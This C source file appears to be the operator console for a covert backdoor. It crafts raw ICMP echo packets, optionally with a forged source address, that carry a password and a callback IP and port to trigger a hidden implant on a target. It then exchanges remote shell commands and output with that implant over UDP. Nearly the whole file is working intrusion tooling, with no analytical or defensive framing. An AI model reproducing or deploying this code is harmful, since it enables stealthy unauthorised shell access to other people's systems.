#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <pthread.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>

enum STATUS {
	CONNECTED, STANDBY
};
enum ACTIVE_INDEX{
	ACT_COMMAND,
	SELF_IP,
	TARGET_IP,
	PASSWD,
	REVERSE_IP,
	REVERSE_PORT
};
enum CONNECT_INDEX{
	CON_COMMAND,
	SERVER_IP,
	SERVER_PORT
};
struct sockaddr_in addr;
struct icmp_packet {
	char src_addr[100];
	char dest_addr[100];
	int type;
	char *payload;
	int payload_size;
};

int sock = 0;
char buff[512];

void set_reply_type(struct icmp_packet *packet);
int open_icmp_socket();
void send_icmp_packet(int sock_fd, struct icmp_packet *packet_details);
void close_icmp_socket(int sock_fd);
uint16_t in_cksum(uint16_t *addr, int len);
void prepare_headers(struct iphdr *ip, struct icmphdr *icmp);
void set_echo_type(struct icmp_packet *packet);
void active_remote(char params[5][32]);
int parse_internal_cmd(char *buffer, char param[5][32]);
int receiveMSG();

int main(int argc, char **argv) {
	char params[6][32];

	printf("This is a UDP client\n		--solaris G1C\n");

	int flag = STANDBY;

	pthread_t thread_id;
	int ret;
	while (1) {
		memset(buff, 0, sizeof(buff));
		memset(params, 0, sizeof(params));
		fgets(buff, 512, stdin);
		buff[strlen(buff) - 1] = 0;
		// internal command list
		ret = parse_internal_cmd(buff, params);
		if (strcmp(params[0], "active") == 0) {

			if (ret != 6) {
				printf(
						"usage: active self_IP target_IP passwd return_IP return_PORT\n");
				continue;
			}
			if (flag == CONNECTED) {
				printf("Connection is busy, close it first\n");
				continue;
			}
			sock = socket(AF_INET, SOCK_DGRAM, 0);
			addr.sin_family = AF_INET;
			addr.sin_port = htons(atoi(params[REVERSE_PORT]));
			addr.sin_addr.s_addr = inet_addr(params[REVERSE_IP]);
			bind(sock, (struct sockaddr *) &addr, sizeof(addr));

			pthread_create(&thread_id, NULL, (void *) receiveMSG,
			NULL);
			printf("Create Thread %ld\n", thread_id);

			flag = CONNECTED;

			active_remote(params);
			continue;
		}

		if (strcmp(params[0], "?") == 0) {
			printf("internal command List:\nconnect\nactive\nclose\nbyebye\n");
			continue;
		}
		if (strcmp(params[0], "connect") == 0) {
			if (ret != 3) {
				printf("usage: connect server_IP server_PORT\n");
				continue;
			}
			if (flag == CONNECTED) {
				printf("Connection is busy, close it first\n");
				continue;
			}

			sock = socket(AF_INET, SOCK_DGRAM, 0);
			addr.sin_family = AF_INET;
			addr.sin_port = htons(atoi(params[SERVER_PORT]));
			addr.sin_addr.s_addr = inet_addr(params[SERVER_IP]);
			pthread_create(&thread_id, NULL, (void *) receiveMSG,
			NULL);
			flag = CONNECTED;
			printf("Create Thread %ld\n", thread_id);
			continue;
		}
		if (strcmp(buff, "close") == 0) {
			if (sock != 0) {
				printf("Close socket :%d \n", sock);
				close(sock);
				sock = 0;
				printf("after Close socket :%d \n", sock);
			}
			if (thread_id)
				if (pthread_cancel(thread_id) == 0)
					printf("Thread Canceled\n");
			flag = STANDBY;
			continue;
		}
		// exit command
		if (strcmp(buff, "byebye") == 0) {
			printf("Exit from client!\n");
			break;
		}
		// process remote system shell command
		if (flag == STANDBY)
			continue;
		printf("Send:%d %s\n", sock, buff);
		sendto(sock, buff, strlen(buff), 0, (struct sockaddr *) &addr,
				sizeof(addr));
	}

	return 0;
}

int receiveMSG() {
	while (1) {
		ssize_t n;
		socklen_t retlen = sizeof(addr);
		memset(buff, '\0', sizeof(buff));
		n = recvfrom(sock, buff, 512, 0, (struct sockaddr *) &addr, &retlen);
		pthread_testcancel();
		if (n > 0) {
			buff[n] = 0;
			printf("%s", buff);
		}
	}
}

int parse_internal_cmd(char *buffer, char param[5][32]) {
	const int param_count_max = 6;
	char backup[512];
	strcpy(backup, buffer);
	char *token = strtok(backup, " ");
	int param_count = 0;
	while (token != NULL && param_count < param_count_max) {
		/* While there are tokens in "string" */
		strcpy(param[param_count], token);
		/* Get next token: */
		token = strtok(NULL, " ");
		++param_count;
	}
	return param_count;
}

void active_remote(char params[6][32]) {
	char *dest = params[TARGET_IP];
	char *reverse_ip = params[REVERSE_IP];
	char *reverse_port = params[REVERSE_PORT];
	char *key = params[PASSWD];
	char *self_ip = params[SELF_IP];
	struct icmp_packet packet;
	int sock_fd;
	char command[512];


	strncpy(packet.src_addr, self_ip, strlen(self_ip) + 1);
	strncpy(packet.dest_addr, dest, strlen(dest) + 1);
	set_echo_type(&packet);
	bzero(command, 511);
	sprintf(command, "%s %s %d ", key, reverse_ip, atoi(reverse_port));
	memset(&command[strlen(command)], 'Q', 192 - 8 - strlen(command) - 1);

	packet.payload = command;
	packet.payload_size = strlen(packet.payload);

	sock_fd = open_icmp_socket();

	send_icmp_packet(sock_fd, &packet);

	close_icmp_socket(sock_fd);
}
void set_reply_type(struct icmp_packet *packet) {
	packet->type = ICMP_ECHOREPLY;
}

void set_echo_type(struct icmp_packet *packet) {
	packet->type = ICMP_ECHO;
}
/**
 * Function to open a socket for icmp
 */
int open_icmp_socket() {
	int sock_fd, on = 1;

	sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);

	if (sock_fd == -1) {
		perror("Unable to open ICMP socket\n");
		exit(EXIT_FAILURE);
	}

	// Providing IP Headers
	if (setsockopt(sock_fd, IPPROTO_IP, IP_HDRINCL, (const char *) &on,
			sizeof(on)) == -1) {
		perror("Unable to set IP_HDRINCL socket option\n");
		exit(EXIT_FAILURE);
	}

	return sock_fd;
}
void send_icmp_packet(int sock_fd, struct icmp_packet *packet_details) {
	// Source and destination IPs
	struct in_addr src_addr;
	struct in_addr dest_addr;

	struct iphdr *ip;
	struct icmphdr *icmp;
	char *icmp_payload;

	int packet_size;
	char *packet;

	struct sockaddr_in servaddr;

	inet_pton(AF_INET, packet_details->src_addr, &src_addr);
	inet_pton(AF_INET, packet_details->dest_addr, &dest_addr);

	packet_size = sizeof(struct iphdr) + sizeof(struct icmphdr)
			+ packet_details->payload_size;
	packet = calloc(packet_size, sizeof(uint8_t));
	if (packet == NULL) {
		perror("No memory available\n");
		close_icmp_socket(sock_fd);
		exit(EXIT_FAILURE);
	}

	// Initializing header and payload pointers
	ip = (struct iphdr *) packet;
	icmp = (struct icmphdr *) (packet + sizeof(struct iphdr));
	icmp_payload = (char *) (packet + sizeof(struct iphdr)
			+ sizeof(struct icmphdr));

	prepare_headers(ip, icmp);

	ip->tot_len = htons(packet_size);
	ip->saddr = src_addr.s_addr;
	ip->daddr = dest_addr.s_addr;

	memcpy(icmp_payload, packet_details->payload, packet_details->payload_size);

	icmp->type = packet_details->type;
	icmp->checksum = 0;
	icmp->checksum = in_cksum((unsigned short *) icmp,
			sizeof(struct icmphdr) + packet_details->payload_size);

	memset(&servaddr, 0, sizeof(struct sockaddr_in));
	servaddr.sin_family = AF_INET;
	servaddr.sin_addr.s_addr = dest_addr.s_addr;

	// Sending the packet
	sendto(sock_fd, packet, packet_size, 0, (struct sockaddr *) &servaddr,
			sizeof(struct sockaddr_in));

	free(packet);
}

void close_icmp_socket(int sock_fd) {
	close(sock_fd);
}

uint16_t in_cksum(uint16_t *addr, int len) {
	int nleft = len;
	uint32_t sum = 0;
	uint16_t *w = addr;
	uint16_t answer = 0;

	// Adding 16 bits sequentially in sum
	while (nleft > 1) {
		sum += *w;
		nleft -= 2;
		w++;
	}

	// If an odd byte is left
	if (nleft == 1) {
		*(unsigned char *) (&answer) = *(unsigned char *) w;
		sum += answer;
	}

	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	answer = ~sum;

	return answer;
}

/**
 * Function to fill up common headers for IP and ICMP
 */
void prepare_headers(struct iphdr *ip, struct icmphdr *icmp) {
	ip->version = 4;
	ip->ihl = 5;
	ip->tos = 0;
	ip->id = rand();
	ip->frag_off = 0;
	ip->ttl = 255;
	ip->protocol = IPPROTO_ICMP;

	icmp->code = 0;
	icmp->un.echo.sequence = rand();
	icmp->un.echo.id = rand();
	icmp->checksum = 0;
}
